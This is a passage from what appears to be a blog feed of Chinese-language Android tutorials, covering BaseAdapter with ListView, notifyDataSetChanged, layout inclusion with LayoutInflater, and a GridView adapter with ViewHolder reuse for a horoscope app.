class="token operator">></span> mDatas<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">=</span> context<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>mData<span class="token operator">=</span>mDatas<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> mData<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getItem</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> mData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> position<span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> View <span class="token function">getView</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">,</span> View convertView<span class="token punctuation">,</span> ViewGroup parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ViewHoder holder<span class="token operator">=</span>null<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>convertView<span class="token operator">==</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//item_star_analysis是单个item布局方式xml文件</span>            convertView<span class="token operator">=</span> LayoutInflater<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>item_star_analysis<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            holder<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ViewHoder</span><span class="token punctuation">(</span>convertView<span class="token punctuation">)</span><span class="token punctuation">;</span>            convertView<span class="token punctuation">.</span><span class="token function">setTag</span><span class="token punctuation">(</span>holder<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            holder<span class="token operator">=</span> <span class="token punctuation">(</span>ViewHoder<span class="token punctuation">)</span> convertView<span class="token punctuation">.</span><span class="token function">getTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        StarAnalysisBean bean <span class="token operator">=</span> mData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>        holder<span class="token punctuation">.</span>titleTv<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        holder<span class="token punctuation">.</span>contentTv<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//改变背景颜色</span>        holder<span class="token punctuation">.</span>contentTv<span class="token punctuation">.</span><span class="token function">setBackgroundResource</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> convertView<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">ViewHoder</span><span class="token punctuation">{</span>        TextView titleTv<span class="token punctuation">,</span>contentTv<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">ViewHoder</span><span class="token punctuation">(</span>View view<span class="token punctuation">)</span><span class="token punctuation">{</span>            titleTv<span class="token operator">=</span>view<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>itemstat_tv_title<span class="token punctuation">)</span><span class="token punctuation">;</span>            contentTv<span class="token operator">=</span>view<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>itemstat_tv_content<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p><strong><em>下面代码只需要看注释理解就行了,相关核心内容的代码我会在注释前用感叹号标记</em></strong></p><h4 id="2-1方式一-先set构造器-再更新数据源"><a href="#2-1方式一-先set构造器-再更新数据源" class="headerlink" title="2.1方式一 :(先set构造器,再更新数据源)"></a>2.1方式一 :(先set构造器,再更新数据源)</h4><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//主函数部分</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>Bundle savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_star_analysis<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取上级界面传递过来的数据</span>        Intent intent<span class="token operator">=</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//传过来的是一个类,所以用getSerializableExtra</span>        bean<span class="token operator">=</span> <span class="token punctuation">(</span>StarBean<span class="token punctuation">.</span>StarinfoBean<span class="token punctuation">)</span> intent<span class="token punctuation">.</span><span class="token function">getSerializableExtra</span><span class="token punctuation">(</span><span class="token string">"star"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//initView的代码我省略了</span>        <span class="token function">initView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//！！！！！！！！！！</span>        mDatas<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化显示在ListView上</span>        adapter<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">AnalysisBaseAdapter</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>mDatas<span class="token punctuation">)</span><span class="token punctuation">;</span>        analysisLv<span class="token punctuation">.</span><span class="token function">setAdapter</span><span class="token punctuation">(</span>adapter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//！！！调用函数</span>        <span class="token function">addDataToList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>         <span class="token comment" spellcheck="true">//加载ListView当中的数据源内容</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addDataToList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//添加数据</span>        StarAnalysisBean sab1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"性格特点："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getTd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>lightblue<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"掌管宫位："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getGw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>lightpink<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"显阴阳性："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getYy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>lightgreen<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"最大特征："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getTz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>purple<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"主管星球："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getZg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>orange<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"幸运颜色："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getYs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>colorAccent<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"搭配珠宝："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getZb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>colorPrimary<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"幸运号码："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getHm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>grey<span class="token punctuation">)</span><span class="token punctuation">;</span>        StarAnalysisBean sab9 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarAnalysisBean</span><span class="token punctuation">(</span><span class="token string">"相配金属："</span><span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> R<span class="token punctuation">.</span>color<span class="token punctuation">.</span>darkblue<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab1<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab2<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab3<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab4<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab5<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab6<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab7<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab8<span class="token punctuation">)</span><span class="token punctuation">;</span>        mDatas<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sab9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//！！！数据源发生变化,提醒适配器更新</span>        adapter<span class="token punctuation">.</span><span class="token function">notifyDataSetChanged</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong><em>mDatas最开始是没有数据的,但是因为下面调用addDataToList()提醒适配器更新,所以可以addDataToList()写在后面</em></strong></p><h4 id="2-2方式二-可以这样写但是不推荐"><a href="#2-2方式二-可以这样写但是不推荐" class="headerlink" title="2.2方式二(可以这样写但是不推荐):"></a>2.2方式二(可以这样写但是不推荐):</h4><p>addDataToList()写在前面设置适配器的前面,在设置适配器的时候顺便就把数据给赋了,但是在addDataToList()中必须把    adapter.notifyDataSetChanged();这行代码给去掉</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多个xml布局的共享与拼接</title>
      <link href="/2020/07/27/gong-xiang-xml-bu-ju/"/>
      <url>/2020/07/27/gong-xiang-xml-bu-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="一-在一个xml文件中添加另一个xml文件布局"><a href="#一-在一个xml文件中添加另一个xml文件布局" class="headerlink" title="一.在一个xml文件中添加另一个xml文件布局"></a>一.在一个xml文件中添加另一个xml文件布局</h2><p>当有多个页面有相同部分时,可以先写一个共有部分的xml文件(比如标题头部),然后在另一个xml文件中写</p><pre><code>    &lt;include layout="@layout/xxxx"/&gt;</code></pre><h2 id="在java中实现对多个xml中布局组件的合并"><a href="#在java中实现对多个xml中布局组件的合并" class="headerlink" title="在java中实现对多个xml中布局组件的合并"></a>在java中实现对多个xml中布局组件的合并</h2><p><img src="https://i.loli.net/2020/07/28/zDPJwdYXf2to5MI.png" alt=""><br>使用LayoutInflater可以实现布局组件的的合并<br>实战案例：(星梦缘star部分二级页面的编写)<br><img src="https://i.loli.net/2020/07/28/E2Z6AkxzvVIpWSe.png" alt="最终效果图1"><br><img src="https://i.loli.net/2020/07/28/WbB5MtoVGO7fIYm.png" alt="最终效果图2"></p><p><img src="https://i.loli.net/2020/07/28/M3rbzJWSPwIGLyN.png" alt="activity_star_analysis.xml"><br><img src="https://i.loli.net/2020/07/28/Ju3qg9X7vpSkDtl.png" alt="footer_star_analysis.xml"><br>分开写了这两个模块之后,想要在ListView下面加上星座解析,在java代码中要这样写 ：   </p><pre class=" language-java"><code class="language-java">        ListView analysisLv<span class="token punctuation">;</span>        <span class="token keyword">private</span> TextView footerTv<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ListView底部需要改变的文字</span>          <span class="token comment" spellcheck="true">//为ListView添加底部布局</span>        View footerView <span class="token operator">=</span> LayoutInflater<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>footer_star_analysis<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将布局转化成View对象(也可以是组件)</span>        analysisLv<span class="token punctuation">.</span><span class="token function">addFooterView</span><span class="token punctuation">(</span>footerView<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置底部的位置添加(也可以设置头部)</span>        footerTv<span class="token operator">=</span>footerView<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>footerstar_tv_info<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong><em>其中analysisLv是ListView的对象,footerstar_tv_info是textview的id,对象我们一般声明在外面的全局区域</em></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网格图GridView的用法+实战</title>
      <link href="/2020/07/27/guan-yu-wang-ge-tu-gridview-de-yong-fa/"/>
      <url>/2020/07/27/guan-yu-wang-ge-tu-gridview-de-yong-fa/</url>
      
        <content type="html"><![CDATA[<p>[<img src="https://s1.ax1x.com/2020/07/27/aPM5Ps.png" alt="效果图">]  </p><h3 id="一-XML布局"><a href="#一-XML布局" class="headerlink" title="一.XML布局"></a>一.XML布局</h3><h4 id="1-主xml写gridview"><a href="#1-主xml写gridview" class="headerlink" title="1.主xml写gridview"></a>1.主xml写gridview</h4><p>其中numColumns用来控制列数      </p><pre><code>    &lt;GridView            android:id="@+id/starfrag_gv"            android:layout_width="match_parent"            android:layout_height="match_parent"            android:numColumns="4"            android:layout_below="@id/starfrag_vp"            /&gt;</code></pre><h4 id="2-额外创建一个xml文件写每个item的布局"><a href="#2-额外创建一个xml文件写每个item的布局" class="headerlink" title="2.额外创建一个xml文件写每个item的布局"></a>2.额外创建一个xml文件写每个item的布局</h4><p><img src="https://i.loli.net/2020/07/28/T3GkcJVydRbsezv.png" alt="item_star_gv"></p><h3 id="二-java代码部分"><a href="#二-java代码部分" class="headerlink" title="二.java代码部分"></a>二.java代码部分</h3><h4 id="1-创建一个GridView的对象"><a href="#1-创建一个GridView的对象" class="headerlink" title="1.创建一个GridView的对象"></a>1.创建一个GridView的对象</h4><pre><code>    starGv=view.findViewById(R.id.starfrag_gv);</code></pre><h4 id="2-写一个适配器StarBaseAdapter继承于BaseAdapter"><a href="#2-写一个适配器StarBaseAdapter继承于BaseAdapter" class="headerlink" title="2.写一个适配器StarBaseAdapter继承于BaseAdapter"></a>2.写一个适配器StarBaseAdapter继承于BaseAdapter</h4><pre class=" language-java"><code class="language-java">        <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StarBaseAdapter</span> <span class="token keyword">extends</span> <span class="token class-name">BaseAdapter</span> <span class="token punctuation">{</span>    Context context<span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>StarInfoBean<span class="token punctuation">.</span>StarinfoBean<span class="token operator">></span>mDatas<span class="token punctuation">;</span>    Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Bitmap<span class="token operator">></span>logoMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">StarBaseAdapter</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>StarInfoBean<span class="token punctuation">.</span>StarinfoBean<span class="token operator">></span> mDatas<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">=</span> context<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>mDatas <span class="token operator">=</span> mDatas<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>logoMap<span class="token operator">=</span> AssetUtils<span class="token punctuation">.</span><span class="token function">getLogoImgMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> mDatas<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getItem</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> mDatas<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> position<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> View <span class="token function">getView</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">,</span> View convertView<span class="token punctuation">,</span> ViewGroup parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ViewHoder hoder<span class="token operator">=</span>null<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>convertView<span class="token operator">==</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>            convertView <span class="token operator">=</span> LayoutInflater<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>item_star_gv<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            hoder<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ViewHoder</span><span class="token punctuation">(</span>convertView<span class="token punctuation">)</span><span class="token punctuation">;</span>            convertView<span class="token punctuation">.</span><span class="token function">setTag</span><span class="token punctuation">(</span>hoder<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            hoder<span class="token operator">=</span><span class="token punctuation">(</span>ViewHoder<span class="token punctuation">)</span> convertView<span class="token punctuation">.</span><span class="token function">getTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//获取指定位置数据</span>        StarInfoBean<span class="token punctuation">.</span>StarinfoBean bean<span class="token operator">=</span> mDatas<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>        hoder<span class="token punctuation">.</span>tv<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获得图片名称,根据名称在内存中查找</span>        String logoName<span class="token operator">=</span>bean<span class="token punctuation">.</span><span class="token function">getLogoname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Bitmap bitmap<span class="token operator">=</span>logoMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>logoName<span class="token punctuation">)</span><span class="token punctuation">;</span>        hoder<span class="token punctuation">.</span>iv<span class="token punctuation">.</span><span class="token function">setImageBitmap</span><span class="token punctuation">(</span>bitmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> convertView<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//对item当中的控件进行声明和初始化操作</span>    <span class="token keyword">class</span> <span class="token class-name">ViewHoder</span><span class="token punctuation">{</span>        CircleImageView iv<span class="token punctuation">;</span>        TextView tv<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">ViewHoder</span><span class="token punctuation">(</span>View view<span class="token punctuation">)</span><span class="token punctuation">{</span>            iv<span class="token operator">=</span>view<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>item_star_iv<span class="token punctuation">)</span><span class="token punctuation">;</span>            tv<span class="token operator">=</span>view<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>item_star_tv<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h4 id="3-适配器的解释："><a href="#3-适配器的解释：" class="headerlink" title="3.适配器的解释："></a>3.适配器的解释：</h4><p>方法一：构造方法要注意数据的获取,参数传递的问题,要拿到图片，文字数据下面才能布局</p><p>方法二 :getCount返回数据组数大小(size)</p><p>方法三:getItem返回当前item  </p><p>方法四 :getItemId返回position</p><p>前四个方法写法都比较简单</p><p>方法五 ：自定义一个ViewHoder内部类,其中在构造方***法中来初始化xml组件<br>其中CircleImageVie是加了依赖后才可以用的组件    </p><pre><code>class ViewHoder{    CircleImageView iv;    TextView tv;    public ViewHoder(View view){        iv=view.findViewById(R.id.item_star_iv);        tv=view.findViewById(R.id.item_star_tv);    }}</code></pre><p>方法六(核心):View getView<br>关于converView: 首先我们要知道setTag方法是干什么的，他是给View对象的一个标签，标签可以是任何内容，我们这里把他设置成了一个对象，为了实现复用,使用getTag和setTag实现复用<br>convertView作用：这个convertView其实就是最关键的部分原理上讲当ListView滑动的过程中 会有item被滑出屏幕而不再被使用，这时候Android会回收这个条目的view 这个view也就是这里的convertView当item1被移除屏幕的时候 我们会重新new一个View给新显示的item_new 而如果使用了这个convertView 我们其实可以复用它 这样就省去了new View的大量开销</p><pre class=" language-java"><code class="language-java">        <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> View <span class="token function">getView</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">,</span> View convertView<span class="token punctuation">,</span> ViewGroup parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ViewHoder hoder<span class="token operator">=</span>null<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>convertView<span class="token operator">==</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//下面的那行代码要加载一下每个item的样式,第一个是item的xml文件布局,第二个参数一般直接null</span>            convertView <span class="token operator">=</span> LayoutInflater<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>item_star_gv<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            hoder<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ViewHoder</span><span class="token punctuation">(</span>convertView<span class="token punctuation">)</span><span class="token punctuation">;</span>            convertView<span class="token punctuation">.</span><span class="token function">setTag</span><span class="token punctuation">(</span>hoder<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            hoder<span class="token operator">=</span><span class="token punctuation">(</span>ViewHoder<span class="token punctuation">)</span> convertView<span class="token punctuation">.</span><span class="token function">getTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实现复用</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//获取指定位置数据</span>        StarInfoBean<span class="token punctuation">.</span>StarinfoBean bean<span class="token operator">=</span> mDatas<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>        hoder<span class="token punctuation">.</span>tv<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" 